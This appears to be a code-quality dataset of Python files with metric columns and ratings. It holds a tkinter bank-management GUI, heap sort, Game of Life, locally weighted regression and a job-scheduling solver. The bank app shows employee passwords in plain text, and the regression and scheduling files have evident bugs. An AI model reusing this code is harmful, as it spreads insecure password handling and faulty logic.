        label.grid(row=0, pady=6)

        global entry11

        entry11 = Entry(search_frame)
        entry11.grid(row=1, pady=6)

        button = Button(search_frame, text=""Search"", command=search_in_database)
        button.grid(row=3)

        mainloop()

    search_acc()


def update():
    def back_to_page2():
        search_frame.grid_forget()
        page2()

    def show_all_updateble_content():
        def back_to_page2_from_update():
            update_customer_frame.grid_forget()
            page2()

        # defining a function whose makes a update entry and submit butoon side to name button
        def update_name():
            # def a function eho updates name in database
            def update_name_in_database():
                new_name = entry_name.get()
                r = check_string_in_account_no(new_name)
                if len(new_name) != 0:
                    # function in backend that updates name in table
                    backend.update_name_in_bank_table(new_name, acc_no)
                    entry_name.destroy()
                    submit_button.destroy()
                    name_label.destroy()
                else:
                    tkinter.messagebox.showinfo(""Error"", ""Please fill blanks"")
                    entry_name.destroy()
                    submit_button.destroy()
                    name_label.destroy()

            global entry_name
            global name_label
            name_label = Label(update_customer_frame, text=""Enter new name"")
            name_label.grid(row=1, column=1)
            entry_name = Entry(update_customer_frame)
            entry_name.grid(row=1, column=2, padx=2)
            global submit_button
            submit_button = Button(
                update_customer_frame, text=""Update"", command=update_name_in_database
            )
            submit_button.grid(row=1, column=3)

        # defing a function who make gui fro age
        def update_age():
            # def a function eho updates name in database
            def update_age_in_database():
                new_age = entry_name.get()
                r = check_string_in_account_no(new_age)
                if len(new_age) != 0 and r:
                    # function in backend that updates name in table
                    backend.update_age_in_bank_table(new_age, acc_no)
                    entry_name.destroy()
                    submit_button.destroy()
                    age_label.destroy()
                else:
                    tkinter.messagebox.showinfo(""Error"", ""Please enter age"")
                    entry_name.destroy()
                    submit_button.destroy()
                    age_label.destroy()

            global age_label
            age_label = Label(update_customer_frame, text=""Enter new Age:"")
            age_label.grid(row=2, column=1)
            global entry_name
            entry_name = Entry(update_customer_frame)
            entry_name.grid(row=2, column=2, padx=2)
            global submit_button
            submit_button = Button(
                update_customer_frame, text=""Update"", command=update_age_in_database
            )
            submit_button.grid(row=2, column=3)

        # defing a function who make gui fro age
        def update_address():
            # def a function eho updates name in database
            def update_address_in_database():
                new_address = entry_name.get()
                if len(new_address) != 0:
                    # function in backend that updates name in table
                    backend.update_address_in_bank_table(new_address, acc_no)
                    entry_name.destroy()
                    submit_button.destroy()
                    address_label.destroy()
                else:
                    tkinter.messagebox.showinfo(""Error"", ""Please fill address"")
                    entry_name.destroy()
                    submit_button.destroy()
                    address_label.destroy()

            global address_label

            address_label = Label(update_customer_frame, text=""Enter new Address:"")
            address_label.grid(row=3, column=1)
            global entry_name
            entry_name = Entry(update_customer_frame)
            entry_name.grid(row=3, column=2, padx=2)
            global submit_button
            submit_button = Button(
                update_customer_frame, text=""Update"", command=update_address_in_database
            )
            submit_button.grid(row=3, column=3)

        acc_no = entry_acc.get()

        r = check_string_in_account_no(acc_no)
        if r:
            result = backend.check_acc_no(acc_no)
            if result:
                search_frame.grid_forget()
                global update_customer_frame
                update_customer_frame = Frame(tk)
                update_customer_frame.grid(padx=300, pady=300)

                label = Label(update_customer_frame, text=""What do you want to update"")
                label.grid(row=0)

                name_button = Button(
                    update_customer_frame, text=""Name"", command=update_name
                )
                name_button.grid(row=1, column=0, pady=6)

                age_button = Button(
                    update_customer_frame, text=""Age"", command=update_age
                )
                age_button.grid(row=2, column=0, pady=6)

                address_button = Button(
                    update_customer_frame, text=""Address"", command=update_address
                )
                address_button.grid(row=3, column=0, pady=6)

                exit_button = Button(
                    update_customer_frame,
                    text=""Exit"",
                    command=back_to_page2_from_update,
                )
                exit_button.grid(row=4)
                mainloop()
            else:
                label = Label(search_frame, text=""Invalid account number"")
                label.grid()

                button = Button(search_frame, text=""Exit"", command=back_to_page2)
                button.grid()

        else:
            label = Label(search_frame, text=""Fill account number"")
            label.grid()

            button = Button(search_frame, text=""Exit"", command=back_to_page2)
            button.grid()

    frame1.grid_forget()
    # define gui for enter account number

    global search_frame
    search_frame = Frame(tk)
    search_frame.grid(padx=500, pady=300)

    label = Label(search_frame, text=""Enter account number"", font=""bold"")
    label.grid(pady=4)

    entry_acc = Entry(search_frame)
    entry_acc.grid(pady=4)

    button = Button(
        search_frame, text=""update"", command=show_all_updateble_content, bg=""red""
    )
    button.grid()


def allmembers():
    def clear_list_frame():
        list_frame.grid_forget()
        page2()

    frame1.grid_forget()
    details = backend.list_all_customers()
    global tk

    global list_frame
    list_frame = Frame(tk)
    list_frame.grid(padx=50, pady=50)
    label = Label(
        list_frame, text=""Acc_no\t\t\tName\t\t\tAge\t\t\tAddress\t\t\tbalance""
    )
    label.grid(pady=6)
    for i in details:
        label = Label(
            list_frame,
            text=""{}\t\t\t{}\t\t\t{}\t\t\t{}\t\t\t{}"".format(
                i[0], i[1], i[2], i[3], i[4]
            ),
        )
        label.grid(pady=4)

    button = Button(
        list_frame, text=""Back"", width=20, height=2, bg=""red"", command=clear_list_frame
    )
    button.grid()
    mainloop()


def delete():
    frame1.grid_forget()

    def search_in_database():
        def back_page2():
            search_frame.grid_forget()
            page2()

        global result
        global acc_no
        acc_no = entry11.get()
        r = check_string_in_account_no(acc_no)
        if len(acc_no) != 0 and r:
            result = backend.check_acc_no(acc_no)
            print(result)
            if not result:

                label = Label(search_frame, text=""invalid account number"")
                label.grid(pady=2)
                button = Button(search_frame, text=""Exit"", command=back_page2)
                button.grid()
                mainloop()
            else:
                backend.delete_acc(acc_no)
                search_frame.grid_forget()
                page2()
        else:
            label = Label(search_frame, text=""Enter correct account number"")
            label.grid(pady=2)
            button = Button(search_frame, text=""Exit"", command=back_page2)
            button.grid()

    def search_acc():
        global search_frame
        search_frame = Frame(tk)
        search_frame.grid(padx=500, pady=300)

        label = Label(search_frame, text=""Enter account number"", font=""bold"")
        label.grid(row=0, pady=6)

        global entry11
        entry11 = Entry(search_frame)
        entry11.grid(row=1, pady=6)

        button = Button(search_frame, text=""Delete"", command=search_in_database)
        button.grid(row=3)

        mainloop()

    search_acc()


# main page for employees
def page2():
    def back_to_main_from_page2():
        frame1.grid_forget()
        global frame
        frame = Frame(tk, bg=""black"")
        frame.grid(padx=500, pady=250)

        button = Button(frame, text=""Admin"", command=admin_login)
        button.grid(row=0, pady=20)

        button = Button(frame, text=""Employee"", command=employee_login)
        button.grid(row=1, pady=20)

        button = Button(frame, text=""Exit"", command=tk.destroy)
        button.grid(row=2, pady=20)
        tk.mainloop()

    frame.grid_forget()
    global frame1
    frame1 = Frame(tk, bg=""black"")
    frame1.grid(padx=500, pady=100)
    button1 = Button(frame1, text=""Create Account"", command=create, width=20, height=2)
    button1.grid(row=0, pady=6)
    button2 = Button(
        frame1, text=""Show Details"", command=search_acc, width=20, height=2
    )
    button2.grid(row=1, pady=6)
    button3 = Button(frame1, text=""Add balance"", command=add, width=20, height=2)
    button3.grid(row=2, pady=6)
    button4 = Button(
        frame1, text=""Withdraw money"", command=withdraw, width=20, height=2
    )
    button4.grid(row=3, pady=6)
    button5 = Button(frame1, text=""Check balance"", command=check, width=20, height=2)
    button5.grid(row=4, pady=6)
    button6 = Button(frame1, text=""Update Account"", command=update, width=20, height=2)
    button6.grid(row=5, pady=6)
    button7 = Button(
        frame1, text=""List of all members"", command=allmembers, width=20, height=2
    )
    button7.grid(row=6, pady=6)
    button8 = Button(frame1, text=""Delete Account"", command=delete, width=20, height=2)
    button8.grid(row=7, pady=6)

    button9 = Button(
        frame1, text=""Exit"", command=back_to_main_from_page2, width=20, height=2
    )
    button9.grid(row=8, pady=6)

    mainloop()


# all buttons of page1
def create_employee():
    def create_emp_in_database():
        def back_to_main_page1_from_create_emp():
            frame_create_emp.grid_forget()
            page1()

        name = entry3.get()
        password = entry4.get()
        salary = entry16.get()
        position = entry17.get()
        if (
            len(name) != 0
            and len(password) != 0
            and len(salary) != 0
            and len(position) != 0
        ):
            backend.create_employee(name, password, salary, position)
            frame_create_emp.grid_forget()
            page1()
        else:
            label = Label(frame_create_emp, text=""Please fill all entries"")
            label.grid(pady=2)

            button = Button(
                frame_create_emp,
                text=""Exit"",
                command=back_to_main_page1_from_create_emp,
                bg=""red"",
            )
            button.grid()

    page1_frame.grid_forget()

    global frame_create_emp
    frame_create_emp = Frame(tk, bg=""black"")
    frame_create_emp.grid(padx=500, pady=200)

    label = Label(frame_create_emp, text=""Name:"", font=""bold"")
    label.grid(row=0, pady=4)
    global entry3
    entry3 = Entry(frame_create_emp)
    entry3.grid(row=1, pady=4)
    label2 = Label(frame_create_emp, text=""Password"", font=""bold"")
    label2.grid(row=2, pady=4)
    global entry4
    entry4 = Entry(frame_create_emp)
    entry4.grid(row=3, pady=4)
    label3 = Label(frame_create_emp, text=""Salary"", font=""bold"")
    label3.grid(row=4, pady=4)
    global entry16
    entry16 = Entry(frame_create_emp)
    entry16.grid(row=5, pady=4)
    label4 = Label(frame_create_emp, text=""Position"", font=""bold"")
    label4.grid(row=6, pady=4)
    global entry17
    entry17 = Entry(frame_create_emp)
    entry17.grid(row=7, pady=4)

    button = Button(
        frame_create_emp,
        text=""Submit"",
        command=create_emp_in_database,
        width=15,
        height=2,
    )
    button.grid(row=8, pady=4)

    mainloop()


def update_employee():
    def update_details_of_staff_member():
        def back_to_page1():
            show_employee_frame.grid_forget()
            page1()

        def update_that_particular_employee():
            show_employee_frame.grid_forget()

            def back_to_page1_from_update():
                update_frame.destroy()
                page1()

            def update_name_in_database():
                def database_calling():
                    new_name = entry19.get()
                    if len(new_name) != 0:
                        old_name = staff_name.get()
                        backend.update_employee_name(new_name, old_name)
                        entry19.destroy()
                        update_button.destroy()
                    else:
                        entry19.destroy()
                        update_button.destroy()
                        tkinter.messagebox.showinfo(""Error"", ""Please fill entry"")

                global entry19
                entry19 = Entry(update_frame)
                entry19.grid(row=1, column=1, padx=4)
                global update_button
                update_button = Button(
                    update_frame, text=""Update"", command=database_calling
                )
                update_button.grid(row=1, column=2, padx=4)

            def update_password_in_database():
                def database_calling():
                    new_password = entry19.get()
                    old_name = staff_name.get()
                    if len(new_password) != 0:
                        backend.update_employee_password(new_password, old_name)
                        entry19.destroy()
                        update_button.destroy()
                    else:
                        entry19.destroy()
                        update_button.destroy()
                        tkinter.messagebox.showinfo(""Error"", ""Please Fill Entry"")

                global entry19
                entry19 = Entry(update_frame)
                entry19.grid(row=2, column=1, padx=4)
                global update_button
                update_button = Button(
                    update_frame, text=""Update"", command=database_calling
                )
                update_button.grid(row=2, column=2, padx=4)

            def update_salary_in_database():
                def database_calling():
                    new_salary = entry19.get()
                    r = check_string_in_account_no(new_salary)
                    if len(new_salary) != 0 and r:

                        old_name = staff_name.get()
                        backend.update_employee_salary(new_salary, old_name)
                        entry19.destroy()
                        update_button.destroy()
                    else:
                        entry19.destroy()
                        update_button.destroy()
                        tkinter.messagebox.showinfo(""Error"", ""Invalid Input"")

                global entry19
                entry19 = Entry(update_frame)
                entry19.grid(row=3, column=1, padx=4)
                global update_button
                update_button = Button(
                    update_frame, text=""Update"", command=database_calling
                )
                update_button.grid(row=3, column=2, padx=4)

            def update_position_in_database():
                def database_calling():
                    new_position = entry19.get()
                    if len(new_position) != 0:

                        old_name = staff_name.get()
                        backend.update_employee_position(new_position, old_name)
                        entry19.destroy()
                        update_button.destroy()
                    else:
                        entry19.destroy()
                        update_button.destroy()
                        tkinter.messagebox.showinfo(""Error"", ""Please Fill Entry"")

                global entry19
                entry19 = Entry(update_frame)
                entry19.grid(row=4, column=1, padx=4)
                global update_button
                update_button = Button(
                    update_frame, text=""Update"", command=database_calling
                )
                update_button.grid(row=4, column=2, padx=4)

            global update_frame
            update_frame = Frame(tk)
            update_frame.grid(padx=400, pady=250)

            label = Label(
                update_frame, text=""press what do you want to update"", font=""bold""
            )
            label.grid(pady=6)

            button = Button(
                update_frame,
                text=""Name"",
                command=update_name_in_database,
                width=14,
                height=2,
            )
            button.grid(row=1, column=0, padx=2, pady=2)

            button = Button(
                update_frame,
                text=""password"",
                command=update_password_in_database,
                width=14,
                height=2,
            )
            button.grid(row=2, column=0, padx=2, pady=2)

            button = Button(
                update_frame,
                text=""salary"",
                command=update_salary_in_database,
                width=14,
                height=2,
            )
            button.grid(row=3, column=0, padx=2, pady=2)

            button = Button(
                update_frame,
                text=""position"",
                command=update_position_in_database,
                width=14,
                height=2,
            )
            button.grid(row=4, column=0, padx=2, pady=2)

            button = Button(
                update_frame,
                text=""Back"",
                command=back_to_page1_from_update,
                width=14,
                height=2,
            )
            button.grid(row=5, column=0, pady=2)

        name = staff_name.get()
        if len(name) != 0:
            result = backend.check_name_in_staff(name)
            if result:

                update_that_particular_employee()
            else:
                label = Label(show_employee_frame, text=""Employee not found"")
                label.grid()

                button = Button(show_employee_frame, text=""Exit"", command=back_to_page1)
                button.grid()

        else:
            label = Label(show_employee_frame, text=""Fill the name"")
            label.grid()

            button = Button(show_employee_frame, text=""Exit"", command=back_to_page1)
            button.grid()

    # entering name of staff member
    page1_frame.grid_forget()
    global show_employee_frame
    show_employee_frame = Frame(tk)
    show_employee_frame.grid(padx=300, pady=300)

    label = Label(
        show_employee_frame,
        text=""Enter name of staff member whom detail would you want to update"",
    )
    label.grid()
    global staff_name
    staff_name = Entry(show_employee_frame)
    staff_name.grid()
    global update_butoon_for_staff
    update_butoon_for_staff = Button(
        show_employee_frame,
        text=""Update Details"",
        command=update_details_of_staff_member,
    )
    update_butoon_for_staff.grid()


def show_employee():
    def back_to_main_page1():
        show_employee_frame.grid_forget()
        page1()

    page1_frame.grid_forget()

    global show_employee_frame
    show_employee_frame = Frame(tk)
    show_employee_frame.grid(padx=50, pady=50)

    label = Label(
        show_employee_frame,
        text=""Name\t\t\tSalary\t\t\tPosition\t\t\tpassword"",
        font=""bold"",
    )
    label.grid(row=0)

    details = backend.show_employees()

    for i in details:
        label = Label(
            show_employee_frame,
            text=""{}\t\t\t{}\t\t\t{}\t\t\t{}"".format(i[0], i[1], i[2], i[3]),
        )
        label.grid(pady=4)

    button = Button(
        show_employee_frame,
        text=""Exit"",
        command=back_to_main_page1,
        width=20,
        height=2,
        bg=""red"",
        font=""bold"",
    )
    button.grid()

    mainloop()


def Total_money():
    def back_to_main_page1_from_total_money():
        all_money.grid_forget()
        page1()

    page1_frame.grid_forget()

    all = backend.all_money()

    global all_money
    all_money = Frame(tk)
    all_money.grid(padx=500, pady=300)

    label = Label(all_money, text=""Total Amount of money"")
    label.grid(row=0, pady=6)

    label = Label(all_money, text=""{}"".format(all))
    label.grid(row=1)

    button = Button(
        all_money,
        text=""Back"",
        command=back_to_main_page1_from_total_money,
        width=15,
        height=2,
    )
    button.grid(row=3)

    mainloop()


def back_to_main():
    page1_frame.grid_forget()
    global frame
    frame = Frame(tk, bg=""black"")
    frame.grid(padx=500, pady=250)

    button = Button(frame, text=""Admin"", command=admin_login)
    button.grid(row=0, pady=20)

    button = Button(frame, text=""Employee"", command=employee_login)
    button.grid(row=1, pady=20)

    button = Button(frame, text=""Exit"", command=tk.destroy)
    button.grid(row=2, pady=20)
    tk.mainloop()

    mainloop()


# mai page for admin
def page1():
    def back_to_main2():
        admin_frame.grid_forget()
        global frame
        frame = Frame(tk, bg=""black"")
        frame.grid(padx=500, pady=250)

        button = Button(frame, text=""Admin"", command=admin_login)
        button.grid(row=0, pady=20)

        button = Button(frame, text=""Employee"", command=employee_login)
        button.grid(row=1, pady=20)

        button = Button(frame, text=""Exit"", command=tk.destroy)
        button.grid(row=2, pady=20)
        tk.mainloop()

        mainloop()

    name = entry1.get()
    password = entry2.get()
    if len(name) != 0 and len(password) != 0:
        result = backend.check_admin(name, password)
        print(result)
        if result:
            admin_frame.grid_forget()

            global page1_frame
            page1_frame = Frame(tk, bg=""black"")
            page1_frame.grid(padx=500, pady=200)

            button10 = Button(
                page1_frame,
                text=""New Employee"",
                command=create_employee,
                width=20,
                height=2,
            )
            button10.grid(row=0, pady=6)

            button11 = Button(
                page1_frame,
                text=""Update detail"",
                command=update_employee,
                width=20,
                height=2,
            )
            button11.grid(row=1, pady=6)

            button13 = Button(
                page1_frame,
                text=""Show All Employee"",
                command=show_employee,
                width=20,
                height=2,
            )
            button13.grid(row=2, pady=6)

            button11 = Button(
                page1_frame, text=""Total Money"", command=Total_money, width=20, height=2
            )
            button11.grid(row=3, pady=6)

            button12 = Button(
                page1_frame, text=""Back"", command=back_to_main, width=20, height=2
            )
            button12.grid(row=4, pady=6)

            mainloop()
        else:
            label = Label(admin_frame, text=""Invalid id and pasasword"")
            label.grid(row=6, pady=10)
            button = Button(admin_frame, text=""Exit"", command=back_to_main2)
            button.grid(row=7)
            mainloop()
    else:
        label = Label(admin_frame, text=""Please fill All Entries"")
        label.grid(row=6, pady=10)
        button = Button(admin_frame, text=""Exit"", command=back_to_main2)
        button.grid(row=7)
        mainloop()


# Login form for employee
def employee_login():
    def back_to_main3():
        employee_frame.grid_forget()
        global frame
        frame = Frame(tk, bg=""black"")
        frame.grid(padx=400, pady=250)

        button = Button(frame, text=""Admin"", command=admin_login)
        button.grid(row=0, pady=20)

        button = Button(frame, text=""Employee"", command=employee_login)
        button.grid(row=1, pady=20)

        button = Button(frame, text=""Exit"", command=tk.destroy)
        button.grid(row=2, pady=20)
        tk.mainloop()

        mainloop()

    def check_emp():
        name = entry1.get()
        password = entry2.get()
        if len(name) != 0 and len(password) != 0:
            result = backend.check_employee(name, password)
            print(result)
            if result:
                employee_frame.grid_forget()
                page2()
            else:
                label = Label(employee_frame, text=""Invalid id and pasasword"")
                label.grid(row=6, pady=10)
                button = Button(employee_frame, text=""Exit"", command=back_to_main3)
                button.grid(row=7)

                mainloop()
        else:
            label = Label(employee_frame, text=""Please Fill All Entries"")
            label.grid(row=6, pady=10)
            button = Button(employee_frame, text=""Exit"", command=back_to_main3)
            button.grid(row=7)

            mainloop()

    frame.grid_forget()

    global employee_frame
    employee_frame = Frame(tk, bg=""black"")
    employee_frame.grid(padx=500, pady=200)

    label = Label(employee_frame, text=""Employee Login"", font=""bold"")
    label.grid(row=0, pady=20)

    label1 = Label(employee_frame, text=""Name:"")
    label1.grid(row=1, pady=10)

    label2 = Label(employee_frame, text=""Password:"")
    label2.grid(row=3, pady=10)
    global entry1
    global entry2
    entry1 = Entry(employee_frame)
    entry1.grid(row=2, pady=10)

    entry2 = Entry(employee_frame, show=""*"")
    entry2.grid(row=4, pady=10)

    button = Button(employee_frame, text=""Submit"", command=check_emp)
    button.grid(row=5, pady=20)
    mainloop()


# Login form for admin
def admin_login():
    frame.grid_forget()
    global admin_frame
    admin_frame = Frame(tk, bg=""black"")
    admin_frame.grid(padx=500, pady=250)

    label = Label(admin_frame, text=""Admin Login"", font=""bold"")
    label.grid(row=0, pady=20)

    label1 = Label(admin_frame, text=""Name:"")
    label1.grid(row=1, pady=10)

    label2 = Label(admin_frame, text=""Password:"")
    label2.grid(row=3, pady=10)
    global entry1
    global entry2
    entry1 = Entry(admin_frame)
    entry1.grid(row=2, pady=10)

    entry2 = Entry(admin_frame, show=""*"")
    entry2.grid(row=4, pady=10)

    button = Button(admin_frame, text=""Submit"", command=page1)
    button.grid(row=5, pady=20)
    mainloop()


# creating window
global tk
tk = Tk()

tk.config(bg=""black"")
tk.title(""Bank Managing System"")
tk.minsize(1200, 800)
tk.maxsize(1200, 800)

global frame
frame = Frame(tk, bg=""black"")
frame.grid(padx=500, pady=250)

button = Button(frame, text=""Admin"", command=admin_login)
button.grid(row=0, pady=20)

button = Button(frame, text=""Employee"", command=employee_login)
button.grid(row=1, pady=20)

button = Button(frame, text=""Exit"", command=tk.destroy)
button.grid(row=2, pady=20)
tk.mainloop()
",41076,869,1058,236,20,20,0,68.0,27,43,3,88.0,65,,131,396.208795349013,797.4576322037946,2.0307692307692307,bajo,No,False,False,Medium,id178
heap_sort.py,"def heapify(nums, heap_size, root_index):
    # Assume the index of the largest element is the root index
    largest = root_index
    left_child = (2 * root_index) + 1
    right_child = (2 * root_index) + 2

    # If the left child of the root is a valid index, and the element is greater
    # than the current largest element, then update the largest element
    if left_child < heap_size and nums[left_child] > nums[largest]:
        largest = left_child

    # Do the same for the right child of the root
    if right_child < heap_size and nums[right_child] > nums[largest]:
        largest = right_child

    # If the largest element is no longer the root element, swap them
    if largest != root_index:
        nums[root_index], nums[largest] = nums[largest], nums[root_index]
        # Heapify the new root element to ensure it's the largest
        heapify(nums, heap_size, largest)


def heap_sort(nums):
    n = len(nums)

    # Create a Max Heap from the list
    # The 2nd argument of range means we stop at the element before -1 i.e.
    # the first element of the list.
    # The 3rd argument of range means we iterate backwards, reducing the count
    # of i by 1
    for i in range(n, -1, -1):
        heapify(nums, n, i)

    # Move the root of the max heap to the end of
    for i in range(n - 1, 0, -1):
        nums[i], nums[0] = nums[0], nums[i]
        heapify(nums, i, 0)


# Verify it works
random_list_of_nums = [35, 12, 43, 8, 51]
heap_sort(random_list_of_nums)
print(random_list_of_nums)
",1517,21,21,9,13,13,0,2.0,9,15,8,27.0,19,,42,104.71062275542812,199.7052750908657,5.684210526315789,alto,No,False,False,,id179
game_o_life.py,"""""""Conway's Game Of Life, Author Anurag Kumar(mailto:anuragkumarak95@gmail.com) 

Requirements:
  - numpy
  - random
  - time
  - matplotlib

Python:
  - 3.5

Usage:
  - $python3 game_o_life <canvas_size:int>

Game-Of-Life Rules:
 
 1.
 Any live cell with fewer than two live neighbours
 dies, as if caused by under-population.
 2.
 Any live cell with two or three live neighbours lives
 on to the next generation.
 3.
 Any live cell with more than three live neighbours
 dies, as if by over-population.
 4.
 Any dead cell with exactly three live neighbours be-
 comes a live cell, as if by reproduction.
 """"""
import random
import sys

import numpy as np

from matplotlib import use as mpluse

mpluse(""TkAgg"")
from matplotlib import pyplot as plt
from matplotlib.colors import ListedColormap

usage_doc = ""Usage of script: script_nama <size_of_canvas:int>""

choice = [0] * 100 + [1] * 10
random.shuffle(choice)


def create_canvas(size):
    canvas = [[False for i in range(size)] for j in range(size)]
    return canvas


def seed(canvas):
    for i, row in enumerate(canvas):
        for j, _ in enumerate(row):
            canvas[i][j] = bool(random.getrandbits(1))


def run(canvas):
    """"""This  function runs the rules of game through all points, and changes their status accordingly.(in the same canvas)
    @Args:
    --
    canvas : canvas of population to run the rules on.

    @returns:
    --
    None
    """"""
    canvas = np.array(canvas)
    next_gen_canvas = np.array(create_canvas(canvas.shape[0]))
    for r, row in enumerate(canvas):
        for c, pt in enumerate(row):
            # print(r-1,r+2,c-1,c+2)
            next_gen_canvas[r][c] = __judge_point(
                pt, canvas[r - 1 : r + 2, c - 1 : c + 2]
            )

    canvas = next_gen_canvas
    del next_gen_canvas  # cleaning memory as we move on.
    return canvas.tolist()


def __judge_point(pt, neighbours):
    dead = 0
    alive = 0
    # finding dead or alive neighbours count.
    for i in neighbours:
        for status in i:
            if status:
                alive += 1
            else:
                dead += 1

    # handling duplicate entry for focus pt.
    if pt:
        alive -= 1
    else:
        dead -= 1

    # running the rules of game here.
    state = pt
    if pt:
        if alive < 2:
            state = False
        elif alive == 2 or alive == 3:
            state = True
        elif alive > 3:
            state = False
    else:
        if alive == 3:
            state = True

    return state


if __name__ == ""__main__"":
    if len(sys.argv) != 2:
        raise Exception(usage_doc)

    canvas_size = int(sys.argv[1])
    # main working structure of this module.
    c = create_canvas(canvas_size)
    seed(c)
    fig, ax = plt.subplots()
    fig.show()
    cmap = ListedColormap([""w"", ""k""])
    try:
        while True:
            c = run(c)
            ax.matshow(c, cmap=cmap)
            fig.canvas.draw()
            ax.cla()
    except KeyboardInterrupt:
        # do nothing.
        pass
",3031,71,70,26,7,6,32,4.0,20,19,8,38.0,21,29.0,57,116.23866587835396,276.90491672227165,7.238095238095238,medio,No,False,True,Medium-High,id180
local_weighted_learning.py,"# Required imports to run this file
import matplotlib.pyplot as plt
import numpy as np


# weighted matrix
def weighted_matrix(point: np.mat, training_data_x: np.mat, bandwidth: float) -> np.mat:
    """"""
    Calculate the weight for every point in the
    data set. It takes training_point , query_point, and tau
    Here Tau is not a fixed value it can be varied depends on output.
    tau --> bandwidth
    xmat -->Training data
    point --> the x where we want to make predictions
    """"""
    # m is the number of training samples
    m, n = np.shape(training_data_x)
    # Initializing weights as identity matrix
    weights = np.mat(np.eye((m)))
    # calculating weights for all training examples [x(i)'s]
    for j in range(m):
        diff = point - training_data[j]
        weights[j, j] = np.exp(diff * diff.T / (-2.0 * bandwidth ** 2))
    return weights


def local_weight(
    point: np.mat, training_data_x: np.mat, training_data_y: np.mat, bandwidth: float
) -> np.mat:
    """"""
    Calculate the local weights using the weight_matrix function on training data.
    Return the weighted matrix.
    """"""
    weight = weighted_matrix(point, training_data_x, bandwidth)
    W = (training_data.T * (weight * training_data)).I * (
        training_data.T * weight * training_data_y.T
    )
    return W


def local_weight_regression(
    training_data_x: np.mat, training_data_y: np.mat, bandwidth: float
) -> np.mat:
    """"""
    Calculate predictions for each data point on axis.
    """"""
    m, n = np.shape(training_data_x)
    ypred = np.zeros(m)

    for i, item in enumerate(training_data_x):
        ypred[i] = item * local_weight(
            item, training_data_x, training_data_y, bandwidth
        )

    return ypred


def load_data(dataset_name: str, cola_name: str, colb_name: str) -> np.mat:
    """"""
    Function used for loading data from the seaborn splitting into x and y points
    """"""
    import seaborn as sns

    data = sns.load_dataset(dataset_name)
    col_a = np.array(data[cola_name])  # total_bill
    col_b = np.array(data[colb_name])  # tip

    mcol_a = np.mat(col_a)
    mcol_b = np.mat(col_b)

    m = np.shape(mcol_b)[1]
    one = np.ones((1, m), dtype=int)

    # horizontal stacking
    training_data = np.hstack((one.T, mcol_a.T))

    return training_data, mcol_b, col_a, col_b


def get_preds(training_data: np.mat, mcol_b: np.mat, tau: float) -> np.ndarray:
    """"""
    Get predictions with minimum error for each training data
    """"""
    ypred = local_weight_regression(training_data, mcol_b, tau)
    return ypred


def plot_preds(
    training_data: np.mat,
    predictions: np.ndarray,
    col_x: np.ndarray,
    col_y: np.ndarray,
    cola_name: str,
    colb_name: str,
) -> plt.plot:
    """"""
    This function used to plot predictions and display the graph
    """"""
    xsort = training_data.copy()
    xsort.sort(axis=0)
    plt.scatter(col_x, col_y, color=""blue"")
    plt.plot(
        xsort[:, 1],
        predictions[training_data[:, 1].argsort(0)],
        color=""yellow"",
        linewidth=5,
    )
    plt.title(""Local Weighted Regression"")
    plt.xlabel(cola_name)
    plt.ylabel(colb_name)
    plt.show()


if __name__ == ""__main__"":
    training_data, mcol_b, col_a, col_b = load_data(""tips"", ""total_bill"", ""tip"")
    predictions = get_preds(training_data, mcol_b, 0.5)
    plot_preds(training_data, predictions, col_a, col_b, ""total_bill"", ""tip"")
",3531,53,66,21,8,6,24,6.0,8,13,6,25.0,21,,38,107.74844088268092,180.68572508221183,3.571428571428572,medio,No,False,False,Low-Medium,id181
Job_scheduling.py,"#!/usr/bin/env python3

""""""
Author : Mohit Kumar
Job Sequencing Problem implemented in python
""""""
from collections import namedtuple
from typing import List


class Scheduling:
    def __init__(self, jobs: List[int]) -> None:
        """"""
        Assign jobs as instance of class Scheduling
        """"""
        self.jobs = jobs

    def schedule(self, total_jobs: int, deadline: List[int]) -> List[int]:
        """"""
        Parameteres  : total_jobs  and list of deadline of jobs
        Returns : List of jobs_id which are profitable  and can be done before
                  deadline
        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])
        >>> a.schedule( 3, [3, 4, 5])
        [(1, 2, 20), (2, 33, 30)]
        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])
        >>> a.schedule( 4, [13, 2, 33, 16])
        [(1, 2, 20), (2, 33, 30), (3, 16, 40)]
        """"""
        self.j = [self.jobs[1]]
        self.x = 2
        while self.x < total_jobs:
            self.k = self.j.copy()
            self.k.append(self.jobs[self.x])
            self.x += 1
            if self.feasible(self.k, deadline):
                self.j = self.k.copy()

        return self.j

    def feasible(self, profit_jobs: List[int], deadline: List[int]) -> bool:
        """"""
        Parameters : list of current profitable jobs within deadline
                     list of deadline of jobs
        Returns : true if k[-1] job is profitable to us else false
        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])
        >>> a.feasible( [0], [2, 13, 16, 33] )
        True
        >>> a = Scheduling([(0, 13, 10),(1, 2, 20),(2, 33, 30),(3, 16, 40)])
        >>> a.feasible([0], [2, 13, 16, 33] )
        True
        """"""

        self.tmp = profit_jobs
        self.is_feasible = True

        i = 0
        j = 1
        k = 0

        while i < len(self.tmp):
            while j < len(self.tmp):
                self.index1 = self.jobs.index(self.tmp[i])
                self.index2 = self.jobs.index(self.tmp[j])
                j += 1
                if deadline[self.index1] > deadline[self.index2]:
                    (self.tmp[i], self.tmp[j]) = (
                        self.tmp[j],
                        self.tmp[i],
                    )
            i += 1

        while k < len(self.tmp):
            self.job = self.tmp[k]
            if self.job in self.jobs:
                self.jobindex = self.jobs.index(self.job)
            else:
                self.jobindex = 0
            self.dlineval = deadline[self.jobindex]
            self.ftest = k + 1
            k += 1
            if self.dlineval < self.ftest:
                self.is_feasible = False
                break
        return self.is_feasible


def main():
    job = namedtuple(""job"", ""job_id deadline profit"")
    jobs = [
        job(0, 0, 0),
        job(1, 2, 46),
        job(2, 4, 52),
        job(3, 3, 30),
        job(4, 3, 36),
        job(5, 2, 56),
        job(6, 1, 40),
    ]
    # midresult stores jobs in sorting order of deadline
    midresult = []
    for i in range(len(jobs)):
        current_job = []
        current_job.extend((jobs[i].deadline, jobs[i].profit, jobs[i].job_id))
        midresult.append(current_job)
    midresult.sort(key=lambda k: (k[0], -k[1]))
    (deadline, profit, jobs) = map(list, zip(*midresult))

    scheduling_jobs = Scheduling(jobs)
    scheduled_jobs = scheduling_jobs.schedule(len(jobs), deadline)
    print(f""\n Jobs {scheduled_jobs}"")

    finalprofit = []
    finaldl = []

    for i, item in enumerate(scheduled_jobs):
        jobsindex = jobs.index(item)
